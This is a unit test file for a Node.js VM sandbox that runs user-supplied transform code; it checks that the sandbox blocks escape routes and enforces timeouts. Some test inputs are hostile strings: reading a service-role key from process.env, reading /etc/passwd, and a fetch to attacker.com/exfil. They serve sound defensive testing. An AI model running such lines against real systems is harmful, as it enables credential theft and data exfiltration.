/**
 * Unit tests for vm-runner — WKH-60 / SEC-RCE-1 W0
 *
 * 11 tests:
 *  - T-VM-1  happy path: simple return body
 *  - T-VM-2  output is bound correctly inside sandbox
 *  - T-VM-3  process is undefined (RCE bypass blocked)
 *  - T-VM-4  require is undefined
 *  - T-VM-5  fetch is undefined
 *  - T-VM-6  eval is blocked (codeGeneration.strings=false)
 *  - T-VM-7  new Function is blocked
 *  - T-VM-8  infinite loop hits TransformTimeoutError
 *  - T-VM-9  syntax error wraps as TransformExecutionError
 *  - T-VM-10 invalid timeoutMs throws TransformExecutionError (input guard)
 *  - T-VM-11 each call gets a fresh context (no cross-call state)
 */
import { describe, expect, it } from 'vitest';
import {
  TransformExecutionError,
  TransformTimeoutError,
  executeTransformInVm,
} from './vm-runner.js';

describe('vm-runner — executeTransformInVm', () => {
  // T-VM-1
  it('T-VM-1: returns the value produced by a simple transform body', () => {
    const result = executeTransformInVm(
      'return { query: output.text };',
      { text: 'hello' },
      1000,
    );
    expect(result).toEqual({ query: 'hello' });
  });

  // T-VM-2
  it('T-VM-2: output is bound and readable inside the sandbox', () => {
    const result = executeTransformInVm(
      'return output.a + output.b;',
      { a: 2, b: 3 },
      1000,
    );
    expect(result).toBe(5);
  });

  // T-VM-3 — Process bypass throws (key RCE attack vector)
  it('T-VM-3: typeof process === "undefined" inside the sandbox (no RCE)', () => {
    expect(() =>
      executeTransformInVm(
        'return process.env.SUPABASE_SERVICE_ROLE_KEY;',
        {},
        1000,
      ),
    ).toThrow(TransformExecutionError);
  });

  // T-VM-4 — Require bypass throws
  it('T-VM-4: require is undefined inside the sandbox', () => {
    expect(() =>
      executeTransformInVm(
        'return require("node:fs").readFileSync("/etc/passwd", "utf8");',
        {},
        1000,
      ),
    ).toThrow(TransformExecutionError);
  });

  // T-VM-5 — Fetch bypass throws
  it('T-VM-5: fetch is undefined inside the sandbox (no SSRF)', () => {
    expect(() =>
      executeTransformInVm(
        'return fetch("http://attacker.com/exfil");',
        {},
        1000,
      ),
    ).toThrow(TransformExecutionError);
  });

  // T-VM-6 — eval blocked (strings: false)
  it('T-VM-6: eval is blocked by codeGeneration.strings = false', () => {
    // eslint-disable-next-line no-eval
    expect(() =>
      executeTransformInVm('return eval("1 + 1");', {}, 1000),
    ).toThrow(TransformExecutionError);
  });

  // T-VM-7 — new Function blocked (strings: false)
  it('T-VM-7: new Function is blocked by codeGeneration.strings = false', () => {
    expect(() =>
      executeTransformInVm('return new Function("return 1")();', {}, 1000),
    ).toThrow(TransformExecutionError);
  });

  // T-VM-8 — Infinite loop is killed by timeout
  it('T-VM-8: infinite loop raises TransformTimeoutError within budget', () => {
    expect(() =>
      executeTransformInVm('while (true) {} return 0;', {}, 50),
    ).toThrow(TransformTimeoutError);
  });

  // T-VM-9 — Syntax error becomes TransformExecutionError
  it('T-VM-9: a syntax error in the body wraps as TransformExecutionError', () => {
    expect(() => executeTransformInVm('return { ;', {}, 1000)).toThrow(
      TransformExecutionError,
    );
  });

  // T-VM-10 — Input guard for timeoutMs
  it('T-VM-10: invalid timeoutMs throws TransformExecutionError before running', () => {
    expect(() => executeTransformInVm('return 1;', {}, 0)).toThrow(
      TransformExecutionError,
    );
    expect(() => executeTransformInVm('return 1;', {}, -10)).toThrow(
      TransformExecutionError,
    );
    expect(() => executeTransformInVm('return 1;', {}, Number.NaN)).toThrow(
      TransformExecutionError,
    );
  });

  // T-VM-11 — No state leaks between calls
  it('T-VM-11: each call gets a fresh sandbox (no cross-call state)', () => {
    // First call: sets a "global" inside the sandbox.
    // Note: the sandbox does not expose `globalThis`, so the only way to
    // attempt persistence is via implicit globals (`x = 1`). Strict mode
    // turns that into a ReferenceError, but the wrapped IIFE in
    // executeTransformInVm runs the body in sloppy mode (no "use strict"),
    // so `x = 1` would survive in the sandbox object IF we reused the
    // context. We must verify it does NOT survive.
    executeTransformInVm('output.bag = "first"; return 1;', { bag: '' }, 1000);

    // Second call: try to read what the first call may have leaked.
    // Since each call creates a NEW context, anything assigned to globals
    // in the first call is gone, AND `output` is rebound to a fresh value.
    const result = executeTransformInVm(
      'return typeof bag;',
      { bag: 'second' },
      1000,
    );
    // `bag` was assigned only as `output.bag` in call 1; in call 2 the
    // identifier `bag` resolves against the (empty) sandbox + (rebound)
    // `output`, so it's `undefined`.
    expect(result).toBe('undefined');
  });
});

describe('vm-runner — TransformTimeoutError shape', () => {
  it('exposes timeoutMs and a clear name', () => {
    try {
      executeTransformInVm('while(true){}', {}, 25);
      throw new Error('did not throw');
    } catch (err) {
      expect(err).toBeInstanceOf(TransformTimeoutError);
      expect((err as TransformTimeoutError).name).toBe('TransformTimeoutError');
      expect((err as TransformTimeoutError).timeoutMs).toBe(25);
    }
  });
});
